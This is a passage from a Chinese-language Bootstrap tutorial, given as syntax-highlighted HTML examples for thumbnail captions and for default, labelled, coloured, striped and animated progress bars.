class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-6 col-md-3&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;thumbnail&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;kittens.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;通用的占位符缩略图&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-2-自定义内容"><a href="#4-2-自定义内容" class="headerlink" title="4.2 自定义内容"></a>4.2 自定义内容</h3><p>添加一点点额外的标签，就可以把任何类型的 HTML 内容，例如标题、段落或按钮，加入缩略图组件内。</p><p>具体步骤：</p><ul><li>把带有  <code>.thumbnail</code> 的 <a> 标签改为 <div>。</li><li>在该 <div> 内，可以添加任何您想要添加的东西。由于这是一个 <div>，可以使用默认的基于 span 的命名规则来调整大小。</li><li>如果想要给多个图像进行分组，请把它们放置在一个无序列表中，且每个列表项向左浮动。</li></ul><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//1<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-6 col-md-4&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;thumbnail&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caption&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Thumbnail label<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br>//2<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-6 col-md-4&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;thumbnail&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caption&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Thumbnail label<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-6 col-md-4&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;thumbnail&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caption&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Thumbnail label<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-sm-6 col-md-4&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;thumbnail&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caption&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Thumbnail label<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>Button<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="5-进度条"><a href="#5-进度条" class="headerlink" title="5.进度条"></a>5.进度条</h2><p>通过这些简单、灵活的进度条，为当前工作流程或动作提供实时反馈。Bootstrap 进度条使用 CSS3 过渡和动画来获得该效果。</p><h3 id="5-1-默认进度条"><a href="#5-1-默认进度条" class="headerlink" title="5.1 默认进度条"></a>5.1 默认进度条</h3><p>创建一个基本的进度条的步骤如下：</p><ul><li>添加一个带有  <code>.progress</code> 的 <div>。</li><li>接着，在上面的 <div> 内，添加一个带有  <code>.progress-bar</code> 的空的 <div>。</li><li>添加一个带有百分比表示的宽度的 style 属性，例如 style=”width: 60%”; 表示进度条在 60% 的位置。</li></ul><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress-bar&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;progressbar&quot;</span> <span class="hljs-attr">aria-valuenow</span>=<span class="hljs-string">&quot;60&quot;</span> <span class="hljs-attr">aria-valuemin</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">aria-valuemax</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 60%;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>60% Complete<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-2-带提示标签的进度条"><a href="#5-2-带提示标签的进度条" class="headerlink" title="5.2 带提示标签的进度条"></a>5.2 带提示标签的进度条</h3><p>将设置了 <code>.sr-only</code> 类的 <code>&lt;span&gt;</code> 标签从进度条组件中移除 类，从而让当前进度显示出来。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress-bar&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;progressbar&quot;</span> <span class="hljs-attr">aria-valuenow</span>=<span class="hljs-string">&quot;60&quot;</span> <span class="hljs-attr">aria-valuemin</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">aria-valuemax</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 60%;&quot;</span>&gt;</span><br>    60%<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>在展示很低的百分比时，如果需要让文本提示能够清晰可见，可以为进度条设置 <code>min-width</code> 属性。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress-bar&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;progressbar&quot;</span> <span class="hljs-attr">aria-valuenow</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">aria-valuemin</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">aria-valuemax</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;min-width: 2em;&quot;</span>&gt;</span><br>    0%<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress-bar&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;progressbar&quot;</span> <span class="hljs-attr">aria-valuenow</span>=<span class="hljs-string">&quot;2&quot;</span> <span class="hljs-attr">aria-valuemin</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">aria-valuemax</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;min-width: 2em; width: 2%;&quot;</span>&gt;</span><br>    2%<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-3-不同样式进度条"><a href="#5-3-不同样式进度条" class="headerlink" title="5.3 不同样式进度条"></a>5.3 不同样式进度条</h3><p>创建不同样式的进度条的步骤：</p><ul><li>添加一个带有  <code>.progress</code> 的 <div>。</li><li>接着，在上面的 <div> 内，添加一个带有  <code>.progress-bar</code> 和  <code>progress-bar-*</code> 的空的 <div>。其中，* 可以是 <code>success</code>、<code>info</code>、<code>warning</code>、<code>danger</code>。</li><li>添加一个带有百分比表示的宽度的 style 属性，例如 style=”60%”; 表示进度条在 60% 的位置。</li></ul><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs htm">&lt;div class&#x3D;&quot;progress&quot;&gt;<br>    &lt;div class&#x3D;&quot;progress-bar progress-bar-success&quot; role&#x3D;&quot;progressbar&quot;<br>         aria-valuenow&#x3D;&quot;60&quot; aria-valuemin&#x3D;&quot;0&quot; aria-valuemax&#x3D;&quot;100&quot;<br>         style&#x3D;&quot;width: 90%;&quot;&gt;<br>        &lt;span class&#x3D;&quot;sr-only&quot;&gt;90% 完成（成功）&lt;&#x2F;span&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;div&gt;<br>&lt;div class&#x3D;&quot;progress&quot;&gt;<br>    &lt;div class&#x3D;&quot;progress-bar progress-bar-info&quot; role&#x3D;&quot;progressbar&quot;<br>         aria-valuenow&#x3D;&quot;60&quot; aria-valuemin&#x3D;&quot;0&quot; aria-valuemax&#x3D;&quot;100&quot;<br>         style&#x3D;&quot;width: 30%;&quot;&gt;<br>        &lt;span class&#x3D;&quot;sr-only&quot;&gt;30% 完成（信息）&lt;&#x2F;span&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;div&gt;<br>&lt;div class&#x3D;&quot;progress&quot;&gt;<br>    &lt;div class&#x3D;&quot;progress-bar progress-bar-warning&quot; role&#x3D;&quot;progressbar&quot;<br>         aria-valuenow&#x3D;&quot;60&quot; aria-valuemin&#x3D;&quot;0&quot; aria-valuemax&#x3D;&quot;100&quot;<br>         style&#x3D;&quot;width: 20%;&quot;&gt;<br>        &lt;span class&#x3D;&quot;sr-only&quot;&gt;20% 完成（警告）&lt;&#x2F;span&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;div&gt;<br>&lt;div class&#x3D;&quot;progress&quot;&gt;<br>    &lt;div class&#x3D;&quot;progress-bar progress-bar-danger&quot; role&#x3D;&quot;progressbar&quot;<br>         aria-valuenow&#x3D;&quot;60&quot; aria-valuemin&#x3D;&quot;0&quot; aria-valuemax&#x3D;&quot;100&quot;<br>         style&#x3D;&quot;width: 10%;&quot;&gt;<br>        &lt;span class&#x3D;&quot;sr-only&quot;&gt;10% 完成（危险）&lt;&#x2F;span&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;div&gt;<br></code></pre></div></td></tr></table></figure><h3 id="5-4-条纹进度条"><a href="#5-4-条纹进度条" class="headerlink" title="5.4 条纹进度条"></a>5.4 条纹进度条</h3><p>通过渐变可以为进度条创建条纹效果。</p><p>创建一个条纹的进度条的步骤：</p><ul><li>添加一个带有  <code>.progress</code> 和 <code>.progress-striped</code> 的 <div>。</li><li>接着，在上面的 <div> 内，添加一个带有  <code>.progress-bar</code> 和  <code>progress-bar-*</code> 的空的 <div>。其中，* 可以是 <code>success</code>、<code>info</code>、<code>warning</code>、<code>danger</code>。</li><li>添加一个带有百分比表示的宽度的 style 属性，例如 style=”60%”; 表示进度条在 60% 的位置。</li></ul><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress progress-striped&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress-bar progress-bar-success&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;progressbar&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">aria-valuenow</span>=<span class="hljs-string">&quot;60&quot;</span> <span class="hljs-attr">aria-valuemin</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">aria-valuemax</span>=<span class="hljs-string">&quot;100&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 90%;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>90% 完成（成功）<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress progress-striped&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress-bar progress-bar-info&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;progressbar&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">aria-valuenow</span>=<span class="hljs-string">&quot;60&quot;</span> <span class="hljs-attr">aria-valuemin</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">aria-valuemax</span>=<span class="hljs-string">&quot;100&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 30%;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>30% 完成（信息）<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress progress-striped&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress-bar progress-bar-warning&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;progressbar&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">aria-valuenow</span>=<span class="hljs-string">&quot;60&quot;</span> <span class="hljs-attr">aria-valuemin</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">aria-valuemax</span>=<span class="hljs-string">&quot;100&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 20%;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>20% 完成（警告）<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress progress-striped&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress-bar progress-bar-danger&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;progressbar&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">aria-valuenow</span>=<span class="hljs-string">&quot;60&quot;</span> <span class="hljs-attr">aria-valuemin</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">aria-valuemax</span>=<span class="hljs-string">&quot;100&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 10%;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>10% 完成（危险）<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-5-动画进度条"><a href="#5-5-动画进度条" class="headerlink" title="5.5 动画进度条"></a>5.5 动画进度条</h3><p>为 <code>.progress-bar-striped</code> 添加 <code>.active</code> 类，使其呈现出由右向左运动的动画效果。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress-bar progress-bar-striped active&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;progressbar&quot;</span> <span class="hljs-attr">aria-valuenow</span>=<span class="hljs-string">&quot;45&quot;</span> <span class="hljs-attr">aria-valuemin</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">aria-valuemax</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 45%&quot;</span>&gt;</span><br>    <span 